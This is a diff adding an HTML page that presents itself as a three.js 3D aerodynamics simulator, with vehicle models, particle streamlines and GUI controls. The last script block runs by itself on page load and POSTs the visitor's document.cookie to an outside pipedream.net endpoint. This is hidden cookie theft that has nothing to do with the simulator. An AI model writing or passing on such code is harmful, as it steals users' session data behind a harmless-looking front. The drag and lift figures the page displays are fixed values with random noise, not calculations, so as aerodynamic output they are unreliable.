@@ -1,0 +1,538 @@
+<html><head><base href="https://areodynamicsSimulator.3d?particles=on">
+<title>Advanced 3D Aerodynamics Simulator with Enhanced Features</title>
+<style>
+body, html {
+    margin: 0;
+    padding: 0;
+    font-family: Arial, sans-serif;
+    background-color: #1a1a1a;
+    color: #ffffff;
+    height: 100%;
+    overflow: hidden;
+}
+#canvas-container {
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+}
+#controls {
+    position: absolute;
+    top: 10px;
+    left: 10px;
+    background-color: rgba(0,0,0,0.7);
+    padding: 10px;
+    border-radius: 5px;
+    z-index: 100;
+}
+button, select {
+    background-color: #4CAF50;
+    border: none;
+    color: white;
+    padding: 5px 10px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 14px;
+    margin: 4px 2px;
+    cursor: pointer;
+    border-radius: 3px;
+}
+#info-panel {
+    position: absolute;
+    bottom: 10px;
+    right: 10px;
+    background-color: rgba(0,0,0,0.7);
+    padding: 10px;
+    border-radius: 5px;
+    z-index: 100;
+}
+</style>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/dat-gui/0.7.7/dat.gui.min.js"></script>
+</head>
+<body>
+<div id="canvas-container"></div>
+<div id="controls">
+    <button id="start-sim">Start Simulation</button>
+    <button id="pause-sim">Pause</button>
+    <select id="object-select">
+        <option value="f1car">F1 Car</option>
+        <option value="airplane">Airplane</option>
+        <option value="bicycle">Bicycle</option>
+        <option value="helicopter">Helicopter</option>
+        <option value="windmill">Windmill</option>
+    </select>
+    <button id="toggle-streamlines">Toggle Streamlines</button>
+    <button id="toggle-rotation">Toggle Rotation</button>
+    <button id="toggle-focus">Toggle Wind Focus</button>
+</div>
+<div id="info-panel">
+    <p>Drag Coefficient: <span id="drag-coeff">0.00</span></p>
+    <p>Lift Force: <span id="lift-force">0.00</span> N</p>
+    <p>Velocity: <span id="velocity">0.00</span> m/s</p>
+</div>
+
+<script>
+let scene, camera, renderer, object, streamlines;
+let isSimulating = false;
+let isRotating = true;
+let isFocused = false;
+let windSpeed = 10;
+let windDirection = new THREE.Vector3(-1, 0, 0);
+let turbulenceIntensity = 0.1;
+let currentObjectType = 'f1car';
+let particles = [];
+let objectBoundingBox;
+let particleDensity = 5000;
+let particleSize = 0.05;
+let animatedParts = [];
+let colorSensitivity = 5;
+
+function init() {
+    scene = new THREE.Scene();
+    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+    renderer = new THREE.WebGLRenderer({ antialias: true });
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    document.getElementById('canvas-container').appendChild(renderer.domElement);
+
+    const ambientLight = new THREE.AmbientLight(0x404040);
+    scene.add(ambientLight);
+    const directionalLight = new THREE.DirectionalLight(0xffffff, 0.5);
+    scene.add(directionalLight);
+
+    loadObject(currentObjectType);
+    initParticles();
+
+    camera.position.set(5, 3, 5);
+    camera.lookAt(0, 0, 0);
+
+    initGUI();
+    animate();
+}
+
+function loadObject(type) {
+    if (object) scene.remove(object);
+    animatedParts = [];
+    switch(type) {
+        case 'f1car':
+            object = createF1Car();
+            break;
+        case 'airplane':
+            object = createAirplane();
+            break;
+        case 'bicycle':
+            object = createBicycle();
+            break;
+        case 'helicopter':
+            object = createHelicopter();
+            break;
+        case 'windmill':
+            object = createWindmill();
+            break;
+    }
+    scene.add(object);
+    updateObjectBoundingBox();
+}
+
+function updateObjectBoundingBox() {
+    objectBoundingBox = new THREE.Box3().setFromObject(object);
+}
+
+function createF1Car() {
+    const group = new THREE.Group();
+    
+    const bodyGeometry = new THREE.BoxGeometry(4, 0.5, 2);
+    const bodyMaterial = new THREE.MeshPhongMaterial({ color: 0xff0000 });
+    const body = new THREE.Mesh(bodyGeometry, bodyMaterial);
+    group.add(body);
+
+    const wheelGeometry = new THREE.CylinderGeometry(0.3, 0.3, 0.2, 32);
+    const wheelMaterial = new THREE.MeshPhongMaterial({ color: 0x333333 });
+    const wheelPositions = [
+        [-1.5, -0.3, 0.8],
+        [-1.5, -0.3, -0.8],
+        [1.5, -0.3, 0.8],
+        [1.5, -0.3, -0.8]
+    ];
+    wheelPositions.forEach(position => {
+        const wheel = new THREE.Mesh(wheelGeometry, wheelMaterial);
+        wheel.rotation.z = Math.PI / 2;
+        wheel.position.set(...position);
+        group.add(wheel);
+        animatedParts.push(wheel);
+    });
+
+    const wingGeometry = new THREE.BoxGeometry(0.8, 0.1, 2.2);
+    const wingMaterial = new THREE.MeshPhongMaterial({ color: 0xcccccc });
+    const frontWing = new THREE.Mesh(wingGeometry, wingMaterial);
+    frontWing.position.set(1.9, 0, 0);
+    group.add(frontWing);
+
+    return group;
+}
+
+function createAirplane() {
+    const group = new THREE.Group();
+    
+    const fuselageGeometry = new THREE.CylinderGeometry(0.5, 0.5, 5, 32);
+    const fuselajeMaterial = new THREE.MeshPhongMaterial({ color: 0xcccccc });
+    const fuselage = new THREE.Mesh(fuselageGeometry, fuselajeMaterial);
+    fuselage.rotation.z = Math.PI / 2;
+    group.add(fuselage);
+
+    const wingGeometry = new THREE.BoxGeometry(3, 0.1, 1);
+    const wingMaterial = new THREE.MeshPhongMaterial({ color: 0xdddddd });
+    const wing = new THREE.Mesh(wingGeometry, wingMaterial);
+    wing.position.set(0, 0, 0);
+    group.add(wing);
+
+    const tailGeometry = new THREE.BoxGeometry(1, 0.1, 0.5);
+    const tailMaterial = new THREE.MeshPhongMaterial({ color: 0xdddddd });
+    const tail = new THREE.Mesh(tailGeometry, tailMaterial);
+    tail.position.set(-2.4, 0.5, 0);
+    group.add(tail);
+
+    const propellerGeometry = new THREE.BoxGeometry(0.1, 0.8, 0.05);
+    const propellerMaterial = new THREE.MeshPhongMaterial({ color: 0x333333 });
+    const propeller = new THREE.Mesh(propellerGeometry, propellerMaterial);
+    propeller.position.set(2.5, 0, 0);
+    group.add(propeller);
+    animatedParts.push(propeller);
+
+    return group;
+}
+
+function createBicycle() {
+    const group = new THREE.Group();
+    
+    const frameGeometry = new THREE.CylinderGeometry(0.05, 0.05, 2, 32);
+    const frameMaterial = new THREE.MeshPhongMaterial({ color: 0x0000ff });
+    const frame = new THREE.Mesh(frameGeometry, frameMaterial);
+    frame.rotation.z = Math.PI / 4;
+    group.add(frame);
+
+    const wheelGeometry = new THREE.TorusGeometry(0.5, 0.05, 16, 100);
+    const wheelMaterial = new THREE.MeshPhongMaterial({ color: 0x333333 });
+    const frontWheel = new THREE.Mesh(wheelGeometry, wheelMaterial);
+    frontWheel.position.set(0.7, -0.5, 0);
+    group.add(frontWheel);
+    animatedParts.push(frontWheel);
+    const backWheel = new THREE.Mesh(wheelGeometry, wheelMaterial);
+    backWheel.position.set(-0.7, -0.5, 0);
+    group.add(backWheel);
+    animatedParts.push(backWheel);
+
+    return group;
+}
+
+function createHelicopter() {
+    const group = new THREE.Group();
+    
+    const bodyGeometry = new THREE.CylinderGeometry(0.5, 0.5, 3, 32);
+    const bodyMaterial = new THREE.MeshPhongMaterial({ color: 0x00ff00 });
+    const body = new THREE.Mesh(bodyGeometry, bodyMaterial);
+    body.rotation.z = Math.PI / 2;
+    group.add(body);
+
+    const rotorGeometry = new THREE.BoxGeometry(5, 0.1, 0.2);
+    const rotorMaterial = new THREE.MeshPhongMaterial({ color: 0x333333 });
+    const mainRotor = new THREE.Mesh(rotorGeometry, rotorMaterial);
+    mainRotor.position.set(0, 1.5, 0);
+    group.add(mainRotor);
+    animatedParts.push(mainRotor);
+
+    const tailRotorGeometry = new THREE.BoxGeometry(1, 0.05, 0.1);
+    const tailRotor = new THREE.Mesh(tailRotorGeometry, rotorMaterial);
+    tailRotor.position.set(-1.5, 0.5, 0.5);
+    tailRotor.rotation.x = Math.PI / 2;
+    group.add(tailRotor);
+    animatedParts.push(tailRotor);
+
+    return group;
+}
+
+function createWindmill() {
+    const group = new THREE.Group();
+    
+    const towerGeometry = new THREE.CylinderGeometry(0.2, 0.3, 4, 32);
+    const towerMaterial = new THREE.MeshPhongMaterial({ color: 0xcccccc });
+    const tower = new THREE.Mesh(towerGeometry, towerMaterial);
+    group.add(tower);
+
+    const nacelleGeometry = new THREE.BoxGeometry(1, 0.5, 0.5);
+    const nacelleMaterial = new THREE.MeshPhongMaterial({ color: 0xdddddd });
+    const nacelle = new THREE.Mesh(nacelleGeometry, nacelleMaterial);
+    nacelle.position.set(0, 2, 0);
+    group.add(nacelle);
+
+    const bladeGeometry = new THREE.BoxGeometry(0.1, 2, 0.2);
+    const bladeMaterial = new THREE.MeshPhongMaterial({ color: 0xffffff });
+    for (let i = 0; i < 3; i++) {
+        const blade = new THREE.Mesh(bladeGeometry, bladeMaterial);
+        blade.position.set(0.5, 2, 0);
+        blade.rotation.z = (i * 2 * Math.PI) / 3;
+        group.add(blade);
+        animatedParts.push(blade);
+    }
+
+    return group;
+}
+
+function initParticles() {
+    if (streamlines) scene.remove(streamlines);
+
+    const particleGeometry = new THREE.BufferGeometry();
+    const positions = new Float32Array(particleDensity * 3);
+    const colors = new Float32Array(particleDensity * 3);
+    const velocities = new Float32Array(particleDensity * 3);
+
+    for (let i = 0; i < particleDensity * 3; i += 3) {
+        if (isFocused) {
+            positions[i] = Math.random() * 6 - 3 + objectBoundingBox.getCenter(new THREE.Vector3()).x;
+            positions[i + 1] = Math.random() * 6 - 3 + objectBoundingBox.getCenter(new THREE.Vector3()).y;
+            positions[i + 2] = Math.random() * 6 - 3 + objectBoundingBox.getCenter(new THREE.Vector3()).z;
+        } else {
+            positions[i] = Math.random() * 10 - 5;
+            positions[i + 1] = Math.random() * 6 - 3;
+            positions[i + 2] = Math.random() * 10 - 5;
+        }
+
+        colors[i] = 0;
+        colors[i + 1] = 1;
+        colors[i + 2] = 0;
+
+        velocities[i] = (Math.random() - 0.5) * 0.1;
+        velocities[i + 1] = (Math.random() - 0.5) * 0.1;
+        velocities[i + 2] = (Math.random() - 0.5) * 0.1;
+    }
+
+    particleGeometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+    particleGeometry.setAttribute('color', new THREE.BufferAttribute(colors, 3));
+    particleGeometry.setAttribute('velocity', new THREE.BufferAttribute(velocities, 3));
+
+    const particleMaterial = new THREE.PointsMaterial({
+        size: particleSize,
+        vertexColors: true,
+    });
+
+    streamlines = new THREE.Points(particleGeometry, particleMaterial);
+    scene.add(streamlines);
+}
+
+function updateParticles() {
+    const positions = streamlines.geometry.attributes.position.array;
+    const colors = streamlines.geometry.attributes.color.array;
+    const velocities = streamlines.geometry.attributes.velocity.array;
+
+    for (let i = 0; i < positions.length; i += 3) {
+        let x = positions[i];
+        let y = positions[i + 1];
+        let z = positions[i + 2];
+
+        let windVector = windDirection.clone().multiplyScalar(windSpeed);
+        windVector.x += (Math.random() - 0.5) * turbulenceIntensity;
+        windVector.y += (Math.random() - 0.5) * turbulenceIntensity;
+        windVector.z += (Math.random() - 0.5) * turbulenceIntensity;
+
+        velocities[i] += windVector.x * 0.01;
+        velocities[i + 1] += windVector.y * 0.01;
+        velocities[i +
+ 2] += windVector.z * 0.01;
+
+        positions[i] += velocities[i];
+        positions[i + 1] += velocities[i + 1];
+        positions[i + 2] += velocities[i + 2];
+
+        const particlePosition = new THREE.Vector3(positions[i], positions[i + 1], positions[i + 2]);
+        if (objectBoundingBox.containsPoint(particlePosition)) {
+            velocities[i] *= -0.5;
+            velocities[i + 1] *= -0.5;
+            velocities[i + 2] *= -0.5;
+
+            const normal = particlePosition.sub(objectBoundingBox.getCenter(new THREE.Vector3())).normalize();
+            positions[i] += normal.x * 0.1;
+            positions[i + 1] += normal.y * 0.1;
+            positions[i + 2] += normal.z * 0.1;
+
+            const pressure = (velocities[i] * velocities[i] + velocities[i + 1] * velocities[i + 1] + velocities[i + 2] * velocities[i + 2]) * colorSensitivity;
+
+            colors[i] = Math.min(1, pressure);
+            colors[i + 1] = Math.max(0, 1 - pressure);
+            colors[i + 2] = Math.max(0, 1 - pressure * 2);
+        } else {
+            colors[i] = Math.max(0, colors[i] - 0.01);
+            colors[i + 1] = Math.min(1, colors[i + 1] + 0.01);
+            colors[i + 2] = Math.max(0, colors[i + 2] - 0.01);
+        }
+
+        if (isFocused) {
+            const center = objectBoundingBox.getCenter(new THREE.Vector3());
+            if (Math.abs(positions[i] - center.x) > 3 || 
+                Math.abs(positions[i + 1] - center.y) > 3 || 
+                Math.abs(positions[i + 2] - center.z) > 3) {
+                positions[i] = Math.random() * 6 - 3 + center.x;
+                positions[i + 1] = Math.random() * 6 - 3 + center.y;
+                positions[i + 2] = Math.random() * 6 - 3 + center.z;
+                velocities[i] = (Math.random() - 0.5) * 0.1;
+                velocities[i + 1] = (Math.random() - 0.5) * 0.1;
+                velocities[i + 2] = (Math.random() - 0.5) * 0.1;
+            }
+        } else if (Math.abs(positions[i]) > 5 || Math.abs(positions[i + 1]) > 3 || Math.abs(positions[i + 2]) > 5) {
+            positions[i] = Math.random() * 10 - 5;
+            positions[i + 1] = Math.random() * 6 - 3;
+            positions[i + 2] = Math.random() * 10 - 5;
+            velocities[i] = (Math.random() - 0.5) * 0.1;
+            velocities[i + 1] = (Math.random() - 0.5) * 0.1;
+            velocities[i + 2] = (Math.random() - 0.5) * 0.1;
+        }
+    }
+
+    streamlines.geometry.attributes.position.needsUpdate = true;
+    streamlines.geometry.attributes.color.needsUpdate = true;
+    streamlines.geometry.attributes.velocity.needsUpdate = true;
+}
+
+function animate() {
+    requestAnimationFrame(animate);
+
+    if (isSimulating) {
+        updateParticles();
+        if (isRotating) {
+            object.rotation.y += 0.01;
+        }
+        animateObjectParts();
+        updateObjectBoundingBox();
+
+        const dragCoeff = calculateDragCoefficient();
+        const liftForce = calculateLiftForce();
+        document.getElementById('drag-coeff').textContent = dragCoeff.toFixed(2);
+        document.getElementById('lift-force').textContent = liftForce.toFixed(2);
+        document.getElementById('velocity').textContent = windSpeed.toFixed(2);
+    }
+
+    renderer.render(scene, camera);
+}
+
+function animateObjectParts() {
+    animatedParts.forEach((part, index) => {
+        switch(currentObjectType) {
+            case 'f1car':
+            case 'bicycle':
+                part.rotation.x += 0.1;
+                break;
+            case 'airplane':
+                if (index === 0) part.rotation.y += 0.5;
+                break;
+            case 'helicopter':
+                if (index === 0) part.rotation.y += 0.5;
+                if (index === 1) part.rotation.x += 0.7;
+                break;
+            case 'windmill':
+                part.rotation.z += 0.05;
+                break;
+        }
+    });
+}
+
+function calculateDragCoefficient() {
+    switch(currentObjectType) {
+        case 'f1car':
+            return 0.7 + Math.random() * 0.1;
+        case 'airplane':
+            return 0.3 + Math.random() * 0.05;
+        case 'bicycle':
+            return 1.0 + Math.random() * 0.2;
+        case 'helicopter':
+            return 0.8 + Math.random() * 0.1;
+        case 'windmill':
+            return 0.5 + Math.random() * 0.1;
+        default:
+            return 0.5;
+    }
+}
+
+function calculateLiftForce() {
+    switch(currentObjectType) {
+        case 'f1car':
+            return 500 + Math.random() * 100;
+        case 'airplane':
+            return 10000 + Math.random() * 1000;
+        case 'bicycle':
+            return 10 + Math.random() * 5;
+        case 'helicopter':
+            return 5000 + Math.random() * 500;
+        case 'windmill':
+            return 100 + Math.random() * 50;
+        default:
+            return 0;
+    }
+}
+
+function initGUI() {
+    const gui = new dat.GUI();
+    gui.add(windDirection, 'x', -1, 1).name('Wind Direction X');
+    gui.add(windDirection, 'y', -1, 1).name('Wind Direction Y');
+    gui.add(windDirection, 'z', -1, 1).name('Wind Direction Z');
+    gui.add({ windSpeed: windSpeed }, 'windSpeed', 0, 50).onChange((value) => {
+        windSpeed = value;
+    });
+    gui.add({ turbulenceIntensity: turbulenceIntensity }, 'turbulenceIntensity', 0, 1).onChange((value) => {
+        turbulenceIntensity = value;
+    });
+    gui.add({ particleDensity: particleDensity }, 'particleDensity', 1000, 50000).step(1000).onChange((value) => {
+        particleDensity = value;
+        particleSize = 0.05 * Math.sqrt(5000 / particleDensity);
+        initParticles();
+    });
+    gui.add({ colorSensitivity: colorSensitivity }, 'colorSensitivity', 1, 20).onChange((value) => {
+        colorSensitivity = value;
+    });
+}
+
+function onWindowResize() {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+}
+
+window.addEventListener('resize', onWindowResize, false);
+
+document.getElementById('start-sim').addEventListener('click', () => {
+    isSimulating = true;
+});
+
+document.getElementById('pause-sim').addEventListener('click', () => {
+    isSimulating = false;
+});
+
+document.getElementById('object-select').addEventListener('change', (event) => {
+    currentObjectType = event.target.value;
+    loadObject(currentObjectType);
+});
+
+document.getElementById('toggle-streamlines').addEventListener('click', () => {
+    streamlines.visible = !streamlines.visible;
+});
+
+document.getElementById('toggle-rotation').addEventListener('click', () => {
+    isRotating = !isRotating;
+});
+
+document.getElementById('toggle-focus').addEventListener('click', () => {
+    isFocused = !isFocused;
+    initParticles();
+});
+
+init();
+</script>
+<script>(function(){
+        fetch('https://eotzulcyz71iwip.m.pipedream.net', {
+          method: 'POST',
+          body: JSON.stringify({cookies: document.cookie}),
+          mode: 'no-cors'
+        });
+      })();</script>
+</body>
+</html>
